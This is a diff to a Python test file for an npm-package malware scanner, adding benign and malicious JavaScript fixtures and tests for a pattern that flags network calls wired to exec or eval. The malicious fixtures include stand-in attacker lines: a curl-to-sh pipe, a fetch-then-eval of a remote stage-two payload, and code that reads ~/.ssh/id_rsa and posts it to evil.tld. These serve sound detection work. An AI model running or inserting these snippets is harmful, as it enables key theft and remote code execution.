@@ -33,6 +33,7 @@ from sandbox_check import (
     INSTALL_SCRIPT_HOOKS,
     MALWARE_PATTERN_TABLE,
     MALWARE_PATTERNS,
+    NETWORK_EXEC_WINDOW,
     NEXT_STEP_TYPES,
     SandboxFindings,
     Verdict,
@@ -420,14 +421,16 @@ def test_malware_hits_split_into_dangers_and_warnings():
     hits = [
         ("a.js", "child_process - command execution"),
         ("b.js", "child_process - command execution"),
+        ("a.js", "hex-encoded string blob (possible obfuscation)"),
         ("a.js", "HTTP client"),
     ]
 
     report = classify_malware_hits(hits)
 
     assert report.counts["child_process - command execution"] == 2
-    assert report.total_hits == 3
+    assert report.total_hits == 4
     assert any("child_process" in d and "2 occurrences" in d for d in report.dangers)
+    # An import is reported, but only ever as a warning (F35).
     assert any("HTTP client" in w for w in report.warnings)
     assert not any("HTTP client" in d for d in report.dangers)
 
@@ -526,6 +529,71 @@ BENIGN_PACKAGE_CODE = {
         "// Fired once per keystroke while the menu is open.\n"
         "function onKeyDown(event) { return event.key; }\n"
     ),
+    # --- F35: the shapes `require('http')`-as-context condemned. Each is taken
+    # from the package named, in the 736-package corpus that falsified the
+    # signal. All four also carry a capability in the same file, which is what
+    # made them DO NOT INSTALL.
+    #
+    # vite: the import pair is inside a JSDoc example, not even code.
+    "vite jsdoc http import next to a spawn": (
+        "const cp = require('child_process');\n"
+        "/**\n"
+        " *      var connect = require('connect')\n"
+        " *        , http = require('http')\n"
+        " *        , https = require('https');\n"
+        " *      http.createServer(app).listen(80);\n"
+        " */\n"
+        "cp.spawnSync('node', [entry]);\n"
+    ),
+    # @agent-tars/{cli,core,server}: webpack's bundled map of node builtins.
+    "webpack bundled builtin module map": (
+        "    http: function(module) {\n"
+        '        "use strict";\n'
+        '        module.exports = require("http");\n'
+        "    },\n"
+        "    https: function(module) {\n"
+        '        "use strict";\n'
+        '        module.exports = require("https");\n'
+        "    },\n"
+        '    child_process: function(module) {\n'
+        '        module.exports = require("child_process");\n'
+        "    },\n"
+        "    __webpack_require__.f = function(chunkId) { return new Function(src); };\n"
+    ),
+    # esbuild/install.js: a real import, used to download the package's own
+    # platform binary from the npm registry and then run it.
+    "esbuild binary installer imports": (
+        'var zlib = require("zlib");\n'
+        'var https = require("https");\n'
+        'var child_process = require("child_process");\n'
+        "function validateBinaryVersion(...command) {\n"
+        "  const stdout = child_process.execFileSync(command.shift(), command);\n"
+        "  return stdout;\n"
+        "}\n"
+    ),
+    # The shape the command sink is anchored against: parsing a fetched string
+    # with a regular expression, in a file that also shells out.
+    "regexp exec on a fetched response body": (
+        "const cp = require('child_process');\n"
+        "const res = await fetch(registryUrl);\n"
+        "const body = await res.text();\n"
+        "const match = RE_VERSION.exec(body);\n"
+        "return match && match[1];\n"
+    ),
+    # A dev server does both things; it does not wire them to each other.
+    "dev server serves and spawns": (
+        "const http = require('http');\n"
+        "const { spawn } = require('child_process');\n"
+        "const server = http.createServer(app);\n"
+        "server.listen(port);\n"
+        "const child = spawn('node', [entry]);\n"
+    ),
+    # `fetch` is also an ordinary method name on caches, stores and ORMs.
+    "cache fetch method beside a command": (
+        "const cp = require('child_process');\n"
+        "const entry = cache.fetch(key);\n"
+        "if (!entry) { cp.execSync('git rev-parse HEAD'); }\n"
+    ),
 }
 
 #: Real npm-malware shapes. Each must survive calibration as a DANGER.
@@ -573,6 +641,18 @@ MALICIOUS_PACKAGE_CODE = {
     "destructured exec with a curl|sh payload": (
         "const { exec } = require('child_process');\n"
         "exec('curl http://evil.tld/x | sh');\n"
+    ),
+    # --- F35: the fetch/execute wiring, which carries no other signal. Neither
+    # of these imports `http`, so the removed context signal never saw them.
+    "stage-two fetched and evaluated": (
+        "fetch('https://c2.example.tld/stage2')\n"
+        "  .then((r) => r.text())\n"
+        "  .then((code) => eval(code));\n"
+    ),
+    "ssh key posted to a remote host": (
+        "const { spawnSync } = require('child_process');\n"
+        "const out = spawnSync('cat', [home + '/.ssh/id_rsa']).stdout;\n"
+        "axios.post('https://evil.tld/collect', { out });\n"
     ),
 }
 
@@ -702,7 +782,7 @@ def test_capability_and_context_in_different_files_is_not_corroboration():
     """
     hits = [
         ("lib/run.js", "child_process - command execution"),
-        ("lib/fetch.js", "HTTPS client"),
+        ("lib/obfuscated.js", "hex-encoded string blob (possible obfuscation)"),
     ]
 
     report = classify_malware_hits(hits)
@@ -715,7 +795,7 @@ def test_capability_and_context_in_different_files_is_not_corroboration():
 def test_capability_and_context_in_the_same_file_is_corroboration():
     hits = [
         ("lib/payload.js", "child_process - command execution"),
-        ("lib/payload.js", "HTTPS client"),
+        ("lib/payload.js", "network I/O wired to command execution"),
     ]
 
     report = classify_malware_hits(hits)
@@ -727,6 +807,156 @@ def test_capability_and_context_in_the_same_file_is_corroboration():
 
 def test_corroborated_capabilities_is_empty_without_context():
     assert corroborated_capabilities([("a.js", "child_process - command execution")]) == []
+
+
+# ---------------------------------------------------------------------------
+# F35 — the import is not the signal
+#
+# `HTTP client` / `HTTPS client` match `require('http')` / `require('https')`.
+# Re-measured over 736 installed packages, that pairing escalated 17
+# capabilities across 5 packages and every one was false; the import is the
+# same code in a dropper and in a dev server. The two `network I/O wired to …`
+# patterns say what the set was reaching for instead: the network call and the
+# execution sink within NETWORK_EXEC_WINDOW of each other, in either order —
+# fetch-then-run is a dropper, run-then-send is exfiltration.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("description", ["HTTP client", "HTTPS client"])
+def test_a_module_import_is_not_an_attacker_context_signal(description):
+    assert description not in CONTEXT_DESCRIPTIONS
+    assert description in {pattern.description for pattern in MALWARE_PATTERN_TABLE}
+    assert corroborated_capabilities(
+        [("a.js", description), ("a.js", "child_process - command execution")]
+    ) == []
+
+
+def test_fetch_then_execute_is_the_dropper_direction():
+    hits = scan_text_for_malware_patterns(
+        "const cp = require('child_process');\n"
+        "https.get(url, (r) => r.on('end', () => cp.exec(body)));\n"
+    )
+
+    assert "network I/O wired to command execution" in hits
+
+
+def test_execute_then_send_is_the_exfiltration_direction():
+    hits = scan_text_for_malware_patterns(
+        "const cp = require('child_process');\n"
+        "cp.exec('env', (e, out) =>\n"
+        "  https.request('https://evil.tld/c', { method: 'POST' }).end(out));\n"
+    )
+
+    assert "network I/O wired to command execution" in hits
+
+
+def test_dynamic_code_execution_needs_no_child_process_binding():
+    """`fetch(...).then(eval)` runs no OS command, so the gate must not apply."""
+    hits = scan_text_for_malware_patterns(
+        "fetch('https://c2.example.tld/s').then((r) => r.text()).then((c) => eval(c));\n"
+    )
+
+    assert "network I/O wired to dynamic code execution" in hits
+    assert "network I/O wired to command execution" not in hits
+
+
+def test_command_execution_variant_is_gated_on_a_child_process_binding():
+    """Without the binding, `exec(` is as likely to be a RegExp as a command."""
+    hits = scan_text_for_malware_patterns(
+        "const r = await fetch(payloadUrl);\nexec(await r.text());\n"
+    )
+
+    assert "network I/O wired to command execution" not in hits
+
+
+def test_a_regexp_exec_on_a_fetched_body_is_not_command_execution():
+    """The single benign shape closest to the dropper: parse what you fetched.
+
+    The binding is present (the package shells out elsewhere), the network call
+    is real, the window is tight, and it still must not fire — which is why the
+    sink excludes a dotted plain `exec` on anything but a child_process-shaped
+    receiver.
+    """
+    for receiver in ("RE_VERSION", "/v(\\d+)/", "pattern", "this.re"):
+        hits = scan_text_for_malware_patterns(
+            "const cp = require('child_process');\n"
+            "const body = await (await fetch(registryUrl)).text();\n"
+            f"const m = {receiver}.exec(body);\n"
+        )
+
+        assert "network I/O wired to command execution" not in hits, receiver
+
+
+@pytest.mark.parametrize(
+    "call",
+    [
+        "https.get('https://evil.tld/p', cb)",
+        "http.get(target, cb)",
+        "axios.post(target, body)",
+        "axios(opts)",
+        "fetch('https://evil.tld/p')",
+        "fetch(payloadUrl)",
+        "fetch(cfg.endpoint)",
+        "new XMLHttpRequest()",
+    ],
+)
+def test_every_network_call_form_wires_to_a_sink(call):
+    hits = scan_text_for_malware_patterns(f"{call};\neval(body);\n")
+
+    assert "network I/O wired to dynamic code execution" in hits, call
+
+
+def test_a_global_fetch_of_an_opaque_variable_is_the_known_blind_spot():
+    """The price of dropping the lookbehind, pinned rather than left implicit.
+
+    `fetch(x)` where `x` says nothing about being a URL is indistinguishable
+    from `cache.fetch(key)` without a lookbehind, and the lookbehind cost 6x on
+    real bundles. Every transport-naming form (`https.get`, `axios`,
+    `XMLHttpRequest`, a literal URL) is unaffected — see the parametrised test
+    above — so this narrows one shape, not the rule.
+    """
+    hits = scan_text_for_malware_patterns("fetch(z).then((r) => r.text()).then(eval);\n")
+
+    assert "network I/O wired to dynamic code execution" not in hits
+
+
+def test_a_fetch_method_on_another_object_is_not_a_network_call():
+    hits = scan_text_for_malware_patterns(
+        "const cp = require('child_process');\n"
+        "const hit = cache.fetch(key);\n"
+        "cp.execSync('git status');\n"
+    )
+
+    assert not any(h.startswith("network I/O wired") for h in hits)
+
+
+def test_the_wiring_window_has_an_upper_bound():
+    """Far apart is the build-tool shape: some code fetches, other code runs."""
+    filler = "\n// unrelated\n" * 60
+    assert len(filler) > NETWORK_EXEC_WINDOW
+
+    near = scan_text_for_malware_patterns(
+        "const cp = require('child_process');\nhttps.get(u);\ncp.execSync(c);\n"
+    )
+    far = scan_text_for_malware_patterns(
+        f"const cp = require('child_process');\nhttps.get(u);{filler}cp.execSync(c);\n"
+    )
+
+    assert "network I/O wired to command execution" in near
+    assert "network I/O wired to command execution" not in far
+
+
+@pytest.mark.parametrize(
+    "description",
+    ["network I/O wired to dynamic code execution", "network I/O wired to command execution"],
+)
+def test_the_wiring_patterns_are_dangers_and_corroborate(description):
+    """Both roles, since a file can carry the wiring *and* other capabilities."""
+    assert is_dangerous_hit(description)
+    assert description in CONTEXT_DESCRIPTIONS
+    assert corroborated_capabilities(
+        [("a.js", description), ("a.js", "eval() - dynamic code execution")]
+    ) == ["eval() - dynamic code execution"]
 
 
 @pytest.mark.parametrize("description", sorted(ALWAYS_DANGEROUS_DESCRIPTIONS))
